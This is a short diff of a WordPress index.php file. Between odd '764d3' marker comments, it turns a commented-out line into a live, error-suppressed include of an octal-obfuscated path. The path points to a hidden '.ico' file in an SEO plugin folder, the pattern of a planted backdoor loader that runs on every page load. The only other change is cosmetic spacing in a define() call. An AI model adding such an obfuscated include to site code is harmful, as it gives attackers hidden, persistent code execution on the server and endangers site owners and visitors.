@@ -1,8 +1,8 @@
 <?php
 /*764d3*/
 
-/*@include "\057h\157m\145/\146o\162g\145/\172a\157m\141k\145u\160.\143o\155.\143o\057w\160-\141d\155i\156/\156e\164w\157r\153/\0563\0657\0632\065b\144.\151c\157";
-*/
+@include "\057home\057forg\145/zao\155akeu\160.com\056co/w\160-con\164ent/\160lugi\156s/wo\162dpre\163s-se\157/.2b\141f36c\145.ico";
+
 /*764d3*/
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
@@ -16,7 +16,7 @@
  *
  * @var bool
  */
-define('WP_USE_THEMES', true);
+define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
 require( dirname( __FILE__ ) . '/wp-blog-header.php' );
